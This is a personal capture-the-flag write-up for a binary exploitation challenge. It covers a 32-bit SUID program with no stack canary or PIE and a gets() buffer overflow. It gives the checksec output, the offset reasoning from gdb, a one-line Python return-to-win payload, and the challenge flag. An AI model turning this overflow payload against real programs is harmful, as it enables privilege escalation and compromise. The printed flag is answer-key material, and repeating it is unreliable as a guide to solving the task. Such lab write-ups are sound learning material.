# offset-cycle

**Category:** binary exploitation
**Difficulty:** Medium  
**Progress:** Solved

---

## Description

**Files:** `CodeBank`, `instructions.txt`, `start`  

```
cat instructions.txt
Hint:

- Run ./start to get a binary from the Code Bank
- You will get a C source file and a binary.
- Once the files are generated, you will have 120 seconds to exploit the binary.
- If the binary is exploited within the time limit, you will get the flag. Otherwise, the process has to be restarted.

```
---

## Analysis + Info Dump

#### file + checksec + readelf
```
SUID-BIT: set (s)
Arch:     ELF 32-bit LSB executable, Intel 80386
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_StACK missing
PIE:      No PIE (0x8048000)
Stack:    Executable
RWX:      Has RWX segments
SYMBOLS:  not stripped

```

```
readelf -l 19
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

```

#### Info Dump
```
Inputting lots of chars kills the program
buffer has 78 bytes of space. gets() is called without any parameter specificing the maximum input size

```

### Vulnerability
- Buffer Overflow

<!--
### Stack Layout
```
┌──────────────────┐
│  buf[0..31]      │  +0
├──────────────────┤
│  padding         │  +32
├──────────────────┤
│  saved EBX       │  +36
├──────────────────┤
│  saved EBP       │  +40
├──────────────────┤
│  return address  │  +44
└──────────────────┘
```
return adress -> push ebp -> push ebx -> sub 0x24 (36<sub>10</sub>)
padding = 0x24 - 0x20 = 0x04 

---
-->
## Solution


### Step 1:

```
no geff only gdb. so no patterns to run
disas vuln shows ebp pushed, ebx pushed. Right before gets we see lea -0x7a (5ebp), %eax 
win sits at 0x080491f6
x

```
### Step 2 — Exploit
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*126 + b"\xf6\x91\x04\x08" + b"\n")' | ./21

```

### Step 3 — Capturing the flag

```
picoCTF{u_Us3d_pwNt00L5_48bdb6db}
```


<!--
---
## Exploit

```python

```
-->

---

## Learnings

- Should probably start using pwntools more. 
- doing manual addition under time pressure is difficult. I used the adress of vuln() instead of win() cause I was so focused on the time
